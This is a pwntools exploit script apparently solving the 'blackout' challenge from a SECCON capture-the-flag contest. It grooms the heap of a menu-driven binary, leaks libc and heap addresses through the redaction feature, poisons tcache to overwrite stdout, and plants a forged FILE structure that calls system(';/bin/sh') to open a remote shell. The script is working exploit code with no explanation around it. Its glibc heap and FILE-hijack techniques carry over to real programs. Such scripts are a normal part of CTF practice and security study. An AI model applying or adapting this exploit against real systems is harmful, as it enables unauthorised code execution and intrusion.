from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './blackout'
HOST = 'blackout.seccon.games'
#HOST = '172.17.0.1'
PORT =  9999

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def alloc(idx, s,  size=-1):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(idx).encode())
    if size == -1:
        r.sendlineafter(b': ', str(len(s)).encode())
    else:
        r.sendlineafter(b': ', str(size).encode())
    r.sendafter(b': ', s)
def blackout(idx, w):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b': ', w)

def delete(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', str(idx).encode())

total = 0
def bulk_alloc_payload(idx, s,  size=-1):
    global total
    if size == -1:
        ret = f'1\n{idx}\n{len(s)+1}\n'.encode()+s+b'\n'
        total += len(s)+1
    else:
        ret = f'1\n{idx}\n{size}\n'.encode()+s+b'\n'
        total += size
    return ret


#context.log_level = 'debug'
n = 0x10000-0x11
tcache_size = 0x3b0

p = b''
#for i in range(n):
log.info('building payload... ')
p += bulk_alloc_payload(0, b'A'*0x10)
p += bulk_alloc_payload(1, b'B'*0x1ff0)
p += bulk_alloc_payload(2, b'C'*0x30)
p += bulk_alloc_payload(3, b'D'*0x30)
p += bulk_alloc_payload(4, b'E'*tcache_size)
p += bulk_alloc_payload(5, b'F'*tcache_size)
p += bulk_alloc_payload(6, p64(0x21)*(0xa00//8))

p += bulk_alloc_payload(6, b'_', 0x10000-total)

for i in range(n):
    p += bulk_alloc_payload(6, b'_', 0x10000)

p += bulk_alloc_payload(6, b'_', 0x80) #adjust

log.info('sending...')
r.send(p)
log.info('payload sent')

for i in range(n):
    r.recvuntil(b'> ')
context.log_level = 'debug'
if args.D:
	debug(r, [0x13e1])
	#debug(r, [0x13fc, 0x15be])

alloc(6, b'g'*0x19+b'G')
blackout(6, b'G')
r.recvuntil(b'dacted]\n')
delete(1)

alloc(6, b'H'*0x1ff0)
blackout(2, b'a')
r.recvuntil(b'dacted]\n')
binleak = r.recvuntil(b'\n', True).ljust(8, b'\x00')
assert b'*' not in binleak # bad luck
leak = u64(binleak)
base = leak - 0x219ce0
dbg('base')
stdout = base + 0x21a780
system = base + 0x50d60
stdout_lock = base + 0x21ba70

alloc(6, b'I'*0x20)
alloc(6, b'J'*0xa00)

blackout(3, b'a')
r.recvuntil(b'dacted]\n')
binleak = r.recvuntil(b'\n', True).ljust(8, b'\x00')
assert b'*' not in binleak # bad luck
leak = u64(binleak)
heap = leak - 0x22e0
dbg('heap')

delete(5)
delete(4)

payload = b''
payload += b'1'*0x48
payload += flat(0x3c1, (heap+0x10) ^ ((heap+0x2000) >>12))

alloc(6, payload+b'\n', 0x60)
alloc(6, b'2'+b'\n', tcache_size)
payload = b''
payload += p64(0x7000700070007) * 16
payload += flat(stdout)*0x30
alloc(6, payload+b'\n', tcache_size)

payload = b''
payload += flat(0x0101010101010101, u64(b';/bin/sh')) # flags, readp
payload += flat(0, 0) # reade, readb
payload += flat(0, 1) # writeb, writep
payload += flat(0, 0) # bufb, bufp
payload += flat(0, 0) # bufe, saveb
payload += flat(0, 0) # backb, savee
payload += flat(0, 0) # markers, chain
payload += flat(system, 0) # fileno|flags2, old_offset
payload += flat(0, stdout_lock) # 0, lock
payload += flat(0, 0) # offset, codecvt
payload += flat(stdout, 0) # wide_data, freeres_list
payload += flat(0, 0) # freeres_buf
payload += flat(0xffffffff, 0) # freeres_buf
#payload += flat(0, base+0x2160c0-0x58+0x18) # 0, vtable
payload += flat(0, base+0x2160c0) # 0, vtable
payload += flat(stdout+8)

alloc(6, payload)

r.interactive()
r.close()

